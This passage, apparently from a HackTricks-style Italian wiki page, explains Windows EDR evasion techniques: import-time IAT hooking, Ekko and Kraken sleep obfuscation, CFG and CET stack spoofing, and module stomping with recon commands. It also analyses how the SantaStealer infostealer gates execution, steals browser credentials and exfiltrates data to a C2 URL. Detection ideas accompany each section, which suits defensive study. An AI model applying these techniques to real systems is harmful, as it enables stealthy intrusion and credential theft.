- Abbina stack cutting/stack stitching per atterrare nei frame attesi prima del prologo della API.

Operational integration
- Preponi il reflective loader ai DLL post-ex in modo che il PIC e gli hook si inizializzino automaticamente quando il DLL viene caricato.
- Usa uno script Aggressor per registrare le API target così Beacon e BOF beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Detection/DFIR considerations
- Integrità IAT: entry che risolvono in indirizzi non-image (heap/anon); verifica periodica dei puntatori di import.
- Anomalie di stack: return addresses che non appartengono a immagini caricate; transizioni brusche verso PIC non-image; ancestry di `RtlUserThreadStart` incoerente.
- Telemetria del loader: scritture in-process nella IAT, attività precoce di `DllMain` che modifica gli import thunk, regioni RX inattese create al load.
- Image-load evasion: se fai hooking di `LoadLibrary*`, monitora caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Related building blocks and examples
- Reflective loader che eseguono patching della IAT durante il load (es. TitanLdr, AceLdr)
- Memory masking hooks (es. simplehook) e PIC di stack cutting (stackcutting)
- PIC call-stack spoofing stub (es. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Se controlli un reflective loader, puoi fare hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver custom che controlla prima gli hook:

- Costruisci un **resident PICO** (persistent PIC object) che sopravvive dopo che il transient loader PIC libera se stesso.
- Esporta una funzione `setup_hooks()` che sovrascrive il resolver di import del loader (es. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli import ordinal e usa una ricerca hook basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con voci Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook resta valido perché vive dentro il resident PICO.

Questo produce **redirezione IAT in import-time** senza patchare la code section del DLL caricato dopo il load.

### Forcing hookable imports when the target uses PEB-walking

Gli import-time hook si attivano solo se la funzione è davvero nella IAT del target. Se un modulo risolve le API via PEB-walk + hash (nessuna entry di import), forza un import reale così che il path `ProcessImports()` del loader lo veda:

- Sostituisci la risoluzione hashed degli export (es. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore emette una entry IAT, abilitando l’intercettazione quando il reflective loader risolve gli import.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Invece di patchare `Sleep`, fai hooking delle **vere primitive di wait/IPC** usate dall’implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per wait lunghi, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l’immagine in memoria durante l’idle:

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` costruiti ad hoc.
- Catena tipica (x64): imposta l’immagine su `PAGE_READWRITE` → cifra RC4 via `advapi32!SystemFunction032` sull’intera immagine mappata → esegui il wait bloccante → decifra RC4 → **ripristina i permessi per-sezione** attraversando le sezioni PE → segnala completamento.
- `RtlCaptureContext` fornisce un template `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni step.

Dettaglio operativo: restituisci “success” per wait lunghi (es. `WAIT_OBJECT_0`) così il chiamante continua mentre l’immagine è mascherata. Questo pattern nasconde il modulo dagli scanner durante le finestre di idle ed evita la classica signature “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` usata su buffer contigui grandi come un’immagine.
- `VirtualProtect` su range ampi seguito da ripristino custom dei permessi per-sezione.

### Runtime CFG registration for sleep-obfuscation gadgets

Su target con CFG abilitato, il primo jump indiretto verso un gadget mid-function come `jmp [rbx]` o `jmp rdi` di solito fa crashare il processo con `STATUS_STACK_BUFFER_OVERRUN` perché il gadget non è presente nei metadati CFG del modulo. Per mantenere vive le chain stile Ekko/Kraken dentro processi hardened:

- Registra ogni destinazione indiretta usata dalla chain con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entry `CFG_CALL_TARGET_VALID`.
- Per indirizzi dentro immagini caricate (`ntdll`, `kernel32`, `advapi32`), il `MEMORY_RANGE_ENTRY` deve partire dalla **base dell’immagine** e coprire la **dimensione completa dell’immagine**.
- Per regioni manualmente mappate/PIC/stomped, usa invece la **allocation base** e la dimensione dell’allocazione.
- Marca non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall) e qualsiasi sezione eseguibile controllata dall’attaccante che diventerà un target indiretto.

Questo trasforma le sleep chain in stile ROP/JOP da “funziona solo in processi non-CFG” in un primitivo riutilizzabile per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

La sostituzione completa di `CONTEXT` è rumorosa e può rompersi su sistemi CET Shadow Stack perché un `Rip` spoofato deve comunque essere coerente con lo shadow stack hardware. Un pattern più sicuro per mascherare il sleep è:

- Scegli un altro thread nello stesso processo e leggi i limiti stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Fai backup del vero TEB/TIB del thread corrente.
- Cattura il vero contesto di sleep con `GetThreadContext`.
- Copia **solo** il vero `Rip` nel contesto spoofato, lasciando intatto lo stato spoofato di `Rsp`/stack.
- Durante la finestra di sleep, copia il `NT_TIB` del thread spoofato nel TEB corrente così gli stack walker unwindano dentro un range di stack legittimo.
- Dopo la fine del wait, ripristina il TIB originale e il contesto del thread.

Questo preserva un instruction pointer coerente con CET e allo stesso tempo inganna gli EDR stack walker che si fidano dei metadati stack del TEB per validare gli unwind.

### APC-based alternative: Kraken Mask

Se la dispatch tramite timer queue è troppo firmata, la stessa sequenza sleep-encrypt-spoof-restore può essere eseguita da un helper thread sospeso usando APC in coda:

- Crea un helper thread con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e svuotali con `NtAlertResumeThread`.
- Salva lo stato della chain nell’heap invece che nello stack dell’helper per evitare di esaurire il thread stack predefinito da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l’evento di start e bloccare.
- Sospendi il main thread prima di ripristinare TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe intercettare uno stack parzialmente ripristinato.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature helper-thread/APC mantenendo gli stessi obiettivi di mascheramento RC4 e stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, wait o dispatch APC.
- `GetThreadContext`/`SetThreadContext` avvolti attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguita da scritture dirette nei limiti stack del TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper di ripristino dei permessi di sezione.
- Uso ripetuto di signature di gadget brevi come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch dentro moduli firmati.


## Precision Module Stomping

Module stomping esegue payload dalla **sezione `.text` di un DLL già mappato nel processo target** invece di allocare memoria privata eseguibile evidente o caricare un nuovo DLL sacrificabile. Il target da sovrascrivere dovrebbe essere un’immagine **caricata e backed by disk**, il cui spazio di codice possa assorbire il payload senza corrompere i code path ancora necessari al processo.

### Reliable target selection

Lo stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: il DLL potrebbe non essere caricato nel processo remoto e una regione di codice troppo piccola farà crashare il processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e mantieni una **include list solo nomi** dei DLL già caricati.
2. Costruisci prima il payload e registra la sua **esatta dimensione in byte**.
3. Scansiona i DLL candidati su disco e confronta la PE section **`.text` `Misc_VirtualSize`** con la dimensione del payload. Questo conta più della dimensione del file perché riflette la dimensione della sezione eseguibile **quando è mappata in memoria**.
4. Parla la **Export Address Table (EAT)** e scegli un RVA di una funzione esportata come offset di inizio dello stomp.
5. Calcola il **blast radius**: se il payload supera il confine della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Note operative
- Preferire DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti immagine inaspettati.
- Preferire export eseguiti raramente dall'applicazione target, altrimenti i normali code path potrebbero raggiungere i byte stomped prima o dopo la creazione del thread.
- Gli implant grandi spesso richiedono di cambiare l'embedding dello shellcode da una stringa letterale a un **byte-array/braced initializer** così che l'intero buffer sia rappresentato correttamente nel source dell'injector.

Idee di detection
- Scritture remote in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece delle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di supporto su disco.
- Thread remoti o context pivot che iniziano l'esecuzione dentro un export legittimo di una DLL i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` contro pagine `.text` delle DLL seguite dalla creazione di thread.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.

### Keyboard layout gating & sandbox delay

- Un flag di config (`anti_cis`) enumera i keyboard layouts installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample deposita un marker vuoto `CIS` e termina prima di eseguire gli stealers, assicurandosi di non detonare mai sui locali esclusi lasciando però un artifact di hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica `check_antivm` a livelli

- La variante A scorre la lista dei processi, calcola l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B ispeziona le proprietà di sistema (soglia minima del conteggio dei processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le aggiunte di VirtualBox e esegue controlli temporali attorno ai sleep per individuare il single-stepping. Qualsiasi rilevamento interrompe tutto prima del lancio dei moduli.

### Helper fileless + caricamento riflessivo doppio ChaCha20

- La DLL/EXE principale incorpora un helper per credenziali Chromium che viene oppure dropato su disco o mappato manualmente in memoria; in modalità fileless risolve da solo import e relocations, così non vengono scritti artefatti dell'helper.
- Quell'helper memorizza una DLL di seconda fase cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambe le passate, la carica riflessivamente nel blob (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine di ChromElevator usano reflective process hollowing con direct-syscall per iniettare in un browser Chromium attivo, ereditare le chiavi di AppBound Encryption e decifrare password/cookie/credit card direttamente dai database SQLite nonostante l'hardening di ABE.


### Raccolta modulare in memoria e exfil HTTP a chunk

- `create_memory_based_log` itera una tabella globale di function-pointer `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e riporta il proprio conteggio file dopo una finestra di join di circa 45s.
- Una volta finito, tutto viene zippato con la libreria linkata staticamente `miniz` come `%TEMP%\\Log.zip`. `ThreadPayload1` poi dorme 15s e trasmette l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary `multipart/form-data` da browser (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionale `w: <campaign_tag>`, e l'ultimo chunk aggiunge `complete: true` così il C2 sa che la ricomposizione è terminata.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
